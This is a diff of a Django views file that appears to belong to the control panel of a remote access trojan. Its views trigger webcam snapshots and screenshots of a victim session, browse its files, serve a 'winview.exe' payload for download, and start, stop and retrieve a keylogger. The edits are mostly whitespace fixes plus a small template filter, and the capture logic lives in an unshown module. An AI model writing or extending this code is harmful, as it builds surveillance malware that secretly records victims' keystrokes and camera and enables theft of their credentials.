@@ -66,11 +66,10 @@ def session_screenshot(request, id):
 	return render(request, 'server/session_screenshot.html', {'id': int(id), 'images': images})
 
 
-
 def action_webcam(request, id):
 	toolbox.post_take_snapshot(session=int(id))
 	return redirect(session_webcam, id)
-        
+
 
 def session_webcam(request, id):
 	images = toolbox.get_snapshots_url()
@@ -113,7 +112,7 @@ def session_explorer(request, id):
 def upload_payload(request):
 	payload_link = '/media/payload/winview.exe'
 	payload_file = os.path.join(anssi.settings.MEDIA_ROOT, 'payload', 'winview.exe')
-	payload_exists = False 
+	payload_exists = False
 
 	if os.path.exists(payload_file):
 		payload_exists = True
@@ -135,17 +134,24 @@ def upload_payload(request):
 
 
 def session_keylogger(request, id):
-	enabled = False 
+	enabled = False
 
 	if request.GET.get('action') == 'start':
 		toolbox.start_keylogger(int(id))
-		enabled = True 
+		enabled = True
 	elif request.GET.get('action') == 'stop':
 		toolbox.stop_keylogger(int(id))
-		enabled = False 
+		enabled = False
 	elif request.GET.get('action') == 'retrieve':
 		value = toolbox.dump_keylogger(int(id))
 		return JsonResponse({'value': value})
-	
+
 	return render(request, 'server/session_keylogger.html', {'id': int(id), 'enabled': enabled})
 
+
+# Template filters
+from django.template.defaulttags import register
+
+@register.filter
+def modulo(num, val):
+    return num % val
